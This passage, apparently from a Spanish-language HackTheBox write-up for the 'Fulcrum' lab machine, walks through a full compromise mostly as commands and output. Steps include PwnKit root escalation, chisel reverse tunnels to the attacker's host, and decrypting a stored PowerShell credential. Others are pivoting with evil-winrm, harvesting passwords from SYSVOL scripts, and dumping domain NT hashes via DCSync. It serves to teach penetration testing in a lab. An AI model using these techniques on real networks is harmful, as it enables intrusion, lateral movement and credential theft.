/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 May 26  2021 </span><span class="err">/usr/bin/pkexec</span><span class="p">
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos usar un <a href="https://github.com/joeammond/CVE-2021-4034">exploit</a> para explotar el famoso <code class="language-plaintext highlighter-rouge">pwnkit</code> y nos convertimos en root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ python3 CVE-2021-4034.py  
[+] Creating shared library for exploit code.
[+] Calling execve()
# bash
</span><span class="ve">root@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
10.10.10.62 192.168.122.1 
</span><span class="ve">root@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p"># ls
msrs.sh  </span><span class="az">snap</span><span class="p">
</span><span class="ve">root@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-webuser">
<br><h3 class="post-title">Shell - webuser</h3><br>

<p class="plain-text">Tenemos otra interfaz y es la <code class="language-plaintext highlighter-rouge">192.168.122.1</code> subiendo un binario estatico de <code class="language-plaintext highlighter-rouge">nmap</code> podemos escanear los <code class="language-plaintext highlighter-rouge">hosts</code> activos en este segmento de red, y aparece otro</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./nmap -sn 192.168.122.0/24 -oG -  
Host: 192.168.122.1    ()	Status: Up
Host: 192.168.122.228  ()	Status: Up
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El host <code class="language-plaintext highlighter-rouge">192.168.122.228</code> esta activo, al hacerle un ping nos responde con un ttl de <code class="language-plaintext highlighter-rouge">128</code> basandonos en ello es bastante probable que sea una maquina <code class="language-plaintext highlighter-rouge">windows</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ping -c1 -w1 192.168.122.228
PING 192.168.122.228 (192.168.122.228) 56(84) bytes of data.
64 bytes from 192.168.122.228: icmp_seq=1 ttl=128 time=0.535 ms  

--- 192.168.122.228 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.535/0.535/0.535/0.000 ms
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Si escaneamos los <code class="language-plaintext highlighter-rouge">puertos</code> de este host aparecen 2, el <code class="language-plaintext highlighter-rouge">80</code> que puede que sea un servicio web y el <code class="language-plaintext highlighter-rouge">5985</code> que muy probablemente sea el servicio de winrm</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./nmap -Pn -n 192.168.122.228
Nmap scan report for 192.168.122.228  
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  unknown
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">chisel</code> crearemos un proxy socks en el puerto <code class="language-plaintext highlighter-rouge">1080</code> para asi tener conexion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./chisel client 10.10.14.10:9999 R:socks &  
[1] 3755
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:9999
server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
</code></pre></div></div><br>

<p class="plain-text">Si abrimos la pagina web del puerto <code class="language-plaintext highlighter-rouge">80</code> pasando por el proxy lo unico que encontramos es la pagina de <code class="language-plaintext highlighter-rouge">.NET</code> que veiamos en el puerto <code class="language-plaintext highlighter-rouge">80</code> y <code class="language-plaintext highlighter-rouge">9999</code></p>
<a href="/hackthebox/fulcrum/13.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/13.png"></p></div></a>

<p class="plain-text">Volviendo al directorio <code class="language-plaintext highlighter-rouge">/var/www/uploads</code> donde recibimos la shell podemos encontrarnos con un script en <code class="language-plaintext highlighter-rouge">powershell</code> el cual define la <code class="language-plaintext highlighter-rouge">credencial</code> de webuser</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~/uploads</span><span class="p">$ ls
Fulcrum_Upload_to_Corp.ps1  home.php  index.php  upload.php
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~/uploads</span><span class="p">$ cat Fulcrum_Upload_to_Corp.ps1 
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='  
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1

</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~/uploads</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos abrir una <code class="language-plaintext highlighter-rouge">pwsh</code>s y ejecutar hasta donde define la variable <code class="language-plaintext highlighter-rouge">$5</code> que contiene la credencial, simplemente usando <code class="language-plaintext highlighter-rouge">.GetNetworkCredential()</code> podemos leer los campos <code class="language-plaintext highlighter-rouge">UserName</code> y <code class="language-plaintext highlighter-rouge">Password</code> de la credencial del usuario <code class="language-plaintext highlighter-rouge">WebUser</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ pwsh</span><span class="p">
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /home/kali> </span><span class="ve">$1 </span><span class="c1">= </span><span class="az">'WebUser'</span><span class="p">
PS /home/kali> </span><span class="ve">$2 </span><span class="c1">= </span><span class="az">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' </span><span class="c1">-split </span><span class="az">','</span><span class="p">
PS /home/kali> </span><span class="ve">$3 </span><span class="c1">= </span><span class="az">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span><span class="p">  
PS /home/kali> </span><span class="ve">$4 </span><span class="c1">= </span><span class="ve">$3</span><span class="p"> | </span><span class="am">ConvertTo-SecureString </span><span class="c1">-key</span><span class="ve"> $2</span><span class="p">
PS /home/kali> </span><span class="ve">$5 </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential (</span><span class="ve">$1</span><span class="p">, </span><span class="ve">$4</span><span class="p">)
PS /home/kali> </span><span class="ve">$5</span><span class="p">.GetNetworkCredential() | </span><span class="am">Select </span><span class="p">UserName</span><span class="c1">,</span><span class="p">Password  

UserName Password
-------- --------
WebUser  M4ng£m£ntPa55

PS /home/kali></span>
</code></pre></div></div><br>

<p class="plain-text">A traves del <code class="language-plaintext highlighter-rouge">proxy</code> tenemos conexion con el puerto <code class="language-plaintext highlighter-rouge">5985</code> asi que con <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos autenticarnos como <code class="language-plaintext highlighter-rouge">WebUser</code> y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> en la maquina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i 192.168.122.228 -u WebUser -p M4ng£m£ntPa55  
PS C:\Users\WebUser\Documents> </span><span class="am">whoami</span><span class="p">
webserver\webuser
PS C:\Users\WebUser\Documents></span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-btables">
<br><h3 class="post-title">Shell - btables</h3><br>

<p class="plain-text">Sabemos que corre una pagina <code class="language-plaintext highlighter-rouge">web</code>, en el directorio donde esta se aloja podemos ver un archivo <code class="language-plaintext highlighter-rouge">web.config</code> que contiene las credenciales del usuario <code class="language-plaintext highlighter-rouge">ldap</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\inetpub\wwwroot> </span><span class="am">dir</span><span class="p">

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2022   2:46 AM            703 iisstart.htm
-a----         5/8/2022   2:46 AM          99710 iisstart.png
-a----        2/12/2022  11:42 PM           5252 index.htm
-a----        2/12/2022  11:42 PM           1280 web.config

PS C:\inetpub\wwwroot> </span><span class="am">type </span><span class="p">web.config
&lt?xml version="1.0" encoding="UTF-8"?>
&ltconfiguration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    &ltappSettings />
    &ltconnectionStrings>
        &ltadd connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    &lt/connectionStrings>
    &ltsystem.web>
        &ltmembership defaultProvider="ADProvider">
            &ltproviders>
                &ltadd name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />  
            &lt/providers>
        &lt/membership>
    &lt/system.web>
&ltsystem.webServer>
   &lthttpProtocol>
      &ltcustomHeaders>
           &ltclear />
      &lt/customHeaders>
   &lt/httpProtocol>
        &ltdefaultDocument>
            &ltfiles>
                &ltclear />
                &ltadd value="Default.asp" />
                &ltadd value="Default.htm" />
                &ltadd value="index.htm" />
                &ltadd value="index.html" />
                &ltadd value="iisstart.htm" />
            &lt/files>
        &lt/defaultDocument>
&lt/system.webServer>
&lt/configuration>
PS C:\inetpub\wwwroot></span>
</code></pre></div></div><br>

<p class="plain-text">Vamos a enumerar un poco el dominio a traves de <code class="language-plaintext highlighter-rouge">ldap</code> pero para facilitar la enumeracion subimos el modulo <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a> y lo importamos en powershell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">upload </span><span class="p">PowerView.ps1
</span><span class="az">
Info: Uploading PowerView.ps1 to C:\ProgramData\PowerView.ps1  
</span><span class="sa">
Data: 1027036 bytes of 1027036 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\ProgramData> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1
PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos definiendo la credencial de <code class="language-plaintext highlighter-rouge">ldap</code> en un formato que le guste a powershell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'PasswordForSearching123!' </span><span class="c1">-AsPlainText -Force</span><span class="p">
PS C:\ProgramData> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'fulcrum.local\ldap'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Al enumerar a los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio encontramos algo interesante, y es que el usuario <code class="language-plaintext highlighter-rouge">BTables</code> en el campo <code class="language-plaintext highlighter-rouge">Info</code> tiene lo que parece ser una <code class="language-plaintext highlighter-rouge">contraseña</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">Get-DomainUser </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-DomainController </span><span class="p">dc.fulcrum.local | </span><span class="am">Select </span><span class="p">Name</span><span class="c1">,</span><span class="p">Info  

name          Info
----          ----
Administrator
Guest
krbtgt
ldap
923a
BTables       Password set to ++FileServerLogon12345++

PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Listando los <code class="language-plaintext highlighter-rouge">equipos</code> que pertenecen al dominio solo encontramos 2 existentes, <code class="language-plaintext highlighter-rouge">FILE</code> que es un equipo aparte y el otro es el propio <code class="language-plaintext highlighter-rouge">DC</code> o controlador de dominio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">Get-DomainComputer </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-DomainController </span><span class="p">dc.fulcrum.local | </span><span class="am">Select </span><span class="p">DNSHostname  

dnshostname
-----------
DC.fulcrum.local
FILE.fulcrum.local

PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">BTables</code>, definimos su credencial y a través de <code class="language-plaintext highlighter-rouge">Invoke-Command</code> podemos ejecutar comandos en <code class="language-plaintext highlighter-rouge">FILE</code> como y leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'++FileServerLogon12345++' </span><span class="c1">-AsPlainText -Force</span><span class="p">
PS C:\ProgramData> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'fulcrum.local\BTables'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
PS C:\ProgramData> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">file.fulcrum.local </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">whoami</span><span class="p"> }
fulcrum\btables
PS C:\ProgramData> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">file.fulcrum.local </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command</span><span class="p"> { </span><span class="am">type </span><span class="p">..\Desktop\user.txt }  
fce**************************af4
PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo es un poco incomodo asi que con <code class="language-plaintext highlighter-rouge">chisel</code> crearemos un nuevo <code class="language-plaintext highlighter-rouge">proxy</code> para tener conexion ahora hacia todos los <code class="language-plaintext highlighter-rouge">equipos</code> que pertenecen al dominio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">upload </span><span class="p">chisel.exe
</span><span class="az">
Info: Uploading chisel.exe to C:\ProgramData\chisel.exe
</span><span class="sa">
Data: 11569152 bytes of 11569152 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\ProgramData> </span><span class="am">.\chisel </span><span class="p">client 10.10.14.10:8888 R:socks  
PS C:\ProgramData></span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 8888
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:8888
server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente a través de <code class="language-plaintext highlighter-rouge">proxychains</code> como el usuaro <code class="language-plaintext highlighter-rouge">BTables</code> nos podemos conectar al servicio <code class="language-plaintext highlighter-rouge">winrm</code> corriendo en el equipo <code class="language-plaintext highlighter-rouge">FILE</code> y obtener una powershell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i file.fulcrum.local -u BTables -p ++FileServerLogon12345++  
PS C:\Users\BTables\Documents> </span><span class="am">whoami</span><span class="p">
fulcrum\btables
PS C:\Users\BTables\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
fce**************************af4
PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-923a">
<br><h3 class="post-title">Shell - 923a</h3><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> con las credenciales de <code class="language-plaintext highlighter-rouge">BTables</code> hacia el <code class="language-plaintext highlighter-rouge">DC</code> podemos listar los recursos SMB compartidos, vemos privilegios lectura o <code class="language-plaintext highlighter-rouge">READ</code> en 3 de ellos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dc.fulcrum.local -u BTables -p ++FileServerLogon12345++  --shares
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:fulcrum.local) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">fulcrum.local\BTables:++FileServerLogon12345++ 
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated shares
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">Share           Permissions     Remark
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">-----           -----------     ------
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">ADMIN$                          Remote Admin
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">C$                              Default share
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">IPC$            READ            Remote IPC
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">NETLOGON        READ            Logon server share 
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">SYSVOL          READ            Logon server share</span>
</code></pre></div></div><br>

<p class="plain-text">Aunque esto tambien podemos hacerlo desde la powershell de BTables usando <code class="language-plaintext highlighter-rouge">net</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\BTables\Documents> </span><span class="am">net </span><span class="p">use \\dc.fulcrum.local /user:fulcrum.local\BTables ++FileServerLogon12345++  
The command completed successfully.

PS C:\Users\BTables\Documents> </span><span class="am">net </span><span class="p">view \\dc.fulcrum.local /all
Shared resources at \\dc.fulcrum.local

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
ADMIN$      Disk           Remote Admin
C$          Disk           Default share
IPC$        IPC   (UNC)    Remote IPC
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.

PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Navegando un poco por los directorios del recurso compartido <code class="language-plaintext highlighter-rouge">SYSVOL</code> llegamos a un directorio el cual contiene varios archivos que son scripts <code class="language-plaintext highlighter-rouge">ps1</code> de powershell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\BTables\Documents> </span><span class="am">dir</span><span class="p"> \\dc.fulcrum.local\SYSVOL

    Directory: \\dc.fulcrum.local\SYSVOL

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d----l         5/7/2022  11:52 PM                fulcrum.local

PS C:\Users\BTables\Documents> </span><span class="am">dir</span><span class="p"> \\dc.fulcrum.local\SYSVOL\fulcrum.local

    Directory: \\dc.fulcrum.local\SYSVOL\fulcrum.local

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2022  11:52 PM                Policies
d-----         5/7/2022  11:52 PM                scripts

PS C:\Users\BTables\Documents> </span><span class="am">dir</span><span class="p"> \\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts

    Directory: \\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/12/2022  10:34 PM            340 00034421-648d-4835-9b23-c0d315d71ba3.ps1
-a----        2/12/2022  10:34 PM            340 0003ed3b-31a9-4d8f-a152-a234ecb522d4.ps1
-a----        2/12/2022  10:34 PM            340 0010183b-2f84-4d4a-9490-b5ae922e3ba1.ps1
.........................................................................................  
-a----        2/12/2022  11:06 PM            340 f5b83c5e-82a9-4316-ba06-3e3d12bfa671.ps1
-a----        2/12/2022  11:06 PM            340 f858d01c-7f92-42e0-b165-cb214d839e26.ps1
-a----        2/12/2022  11:06 PM            340 f9892933-e24b-4211-8a77-d41a2940acd4.ps1

PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Cada uno de estos scripts contiene <code class="language-plaintext highlighter-rouge">credenciales</code> de diferentes usuarios del dominio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\BTables\Documents> </span><span class="am">type </span><span class="p">\\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts\00034421-648d-4835-9b23-c0d315d71ba3.ps1  

# Map network drive v1.0
$User = 'be36'
$Pass = '@fulcrum_43bd6d26c168_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred  

PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Al buscar una string que contenga el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> esperando poder ver su contraseña en texto plano no encontramos ninguna coindidencia en los scripts</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\BTables\Documents> </span><span class="am">Select-String </span><span class="az">'Administrator' </span><span class="p">\\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts\*  
PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo existen mas usuarios por ejemplo <code class="language-plaintext highlighter-rouge">923a</code> que es parte de <code class="language-plaintext highlighter-rouge">Domain Admins</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\BTables\Documents> </span><span class="am">net </span><span class="p">user 923a /domain | </span><span class="am">Select-String </span><span class="p">Group

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users

PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Si buscamos por el usuario la string <code class="language-plaintext highlighter-rouge">923a</code> encontramos un archivo donde esta su usuario, este tambien contiene una <code class="language-plaintext highlighter-rouge">contraseña</code> que probablemente sea la suya</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\BTables\Documents> </span><span class="am">Select-String </span><span class="az">'923a' </span><span class="p">\\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts\*

\\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts\3807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force  
\\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:$User = '923a'

PS C:\Users\BTables\Documents> </span><span class="am">type</span><span class="p"> \\dc.fulcrum.local\SYSVOL\fulcrum.local\Scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1

# Map network drive v1.0
$User = '923a'
$Pass = '@fulcrum_bf392748ef4e_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred  

PS C:\Users\BTables\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Comprobamos las credenciales de <code class="language-plaintext highlighter-rouge">923a</code> con crackmapexec y nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dc.fulcrum.local -u 923a -p @fulcrum_bf392748ef4e_$
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:fulcrum.local) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">fulcrum.local\923a:@fulcrum_bf392748ef4e_$ </span><span class="am">(Pwn3d!)</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos conectarnos como este usuario con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y leer la ultima flag de root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i dc.fulcrum.local -u 923a -p @fulcrum_bf392748ef4e_$  
PS C:\Users\923a\Documents> </span><span class="am">whoami</span><span class="p">
fulcrum\923a
PS C:\Users\923a\Documents> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
8dd**************************cab
PS C:\Users\923a\Documents></span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-administrator">
<br><h3 class="post-title">Shell - Administrator</h3><br>

<p class="plain-text">Si quisieramos una shell especificamente como <code class="language-plaintext highlighter-rouge">Administrator</code> usando la credencial de <code class="language-plaintext highlighter-rouge">923a</code> podemos hacer un DCSync para ver los hashes <code class="language-plaintext highlighter-rouge">NT</code> de todos los usuarios</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb dc.fulcrum.local -u 923a -p @fulcrum_bf392748ef4e_$ --ntds drsuapi
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:fulcrum.local) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">fulcrum.local\923a:@fulcrum_bf392748ef4e_$ </span><span class="am">(Pwn3d!)
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:17ac19e99e0d2140a9162c97414ceb43:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:30dd0b7d7f91ca7b1ec413871f095c64:::
